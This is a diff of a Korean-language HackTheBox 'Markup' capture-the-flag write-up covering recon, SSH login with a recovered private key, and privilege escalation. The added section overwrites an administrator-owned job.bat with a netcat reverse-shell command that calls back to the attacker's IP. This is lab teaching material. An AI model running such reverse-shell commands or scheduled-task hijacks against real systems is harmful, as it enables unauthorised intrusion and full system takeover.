@@ -1,4 +1,8 @@
 # Markup - HackTheBox StartingPoint
+- [Recon](#recon)
+- [HTTP](#http)
+- [Privesc](#privesc)
+- [FLAG](#flag)
 ## Recon
 ```bash
 sudo nmap -p 22,80,443 -sC -sV -oA Markup -vv 10.129.95.192
@@ -63,19 +67,59 @@ echo 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuT.....'|base64 -d
 ```
 <img width="716" height="593" alt="image" src="https://github.com/user-attachments/assets/d0c9f97f-a137-4110-9eff-6224ed37241e" />
 
----
-## SSH
+<br>
+<br>
+
 - `id_rsa`로 `Daniel` 로그인.
 <img width="1106" height="152" alt="image" src="https://github.com/user-attachments/assets/28d6e038-9d4e-46ff-8874-a2c9343cc22c" />
 
 ---
 ## Privesc
-- 서버의 문제인지, privesc가 되지 않아 생략.
+- `c:\Log-Management`에서 `job.bat`파일 발견.
+<img width="1205" height="280" alt="image" src="https://github.com/user-attachments/assets/641938cb-fe9b-46fd-9e7f-75e7c16d00d2" />
 
+<br>
+<br>
+
+- `job.bat`의 소유가 관리자로 되어 있음.
+```powershell
+dir /q job.bat
+```
+<img width="1205" height="231" alt="image" src="https://github.com/user-attachments/assets/62a101e6-861c-41c4-a189-1c6c4372b863" />
+
+<br>
+<br>
+
+- 해당 파일을 수정할 수 있는지 시도.
+- 명령어 실행 성공.
+```powershell
+echo ping -n 5 10.10.15.168 > job.bat
+```
+<img width="1205" height="126" alt="image" src="https://github.com/user-attachments/assets/53e0ce33-9774-4b8a-b23f-33dc910d2cfe" />
+<img width="1205" height="341" alt="image" src="https://github.com/user-attachments/assets/dba9978a-72e7-4d96-b0c0-615fcf9a27b0" />
+
+<br>
+<br>
+
+- 리버스 셸 실행 코드로 수정.
+```powershell
+echo c:\\programdata\\nc.exe 10.10.15.168 80 -e cmd.exe > job.bat
+```
+<img width="1205" height="106" alt="image" src="https://github.com/user-attachments/assets/b44bb192-447c-4718-bd2b-0cb105fd9633" />
+
+<br>
+<br>
+
+- 셸 획득.
+<img width="1205" height="245" alt="image" src="https://github.com/user-attachments/assets/d881bc81-b9d0-4297-b934-f153f9a53e8e" />
+
+---
 ## FLAG
 - `c:\users\daniel\desktop\user.txt`
 <img width="1106" height="229" alt="image" src="https://github.com/user-attachments/assets/1a91884a-da5f-4940-8bed-d119999fb1de" />
 
+- `c:\users\administrator\desktop\root.txt`
+<img width="1205" height="299" alt="image" src="https://github.com/user-attachments/assets/2edec031-6079-4a97-bfb0-8913f200f5ae" />
 
 
 
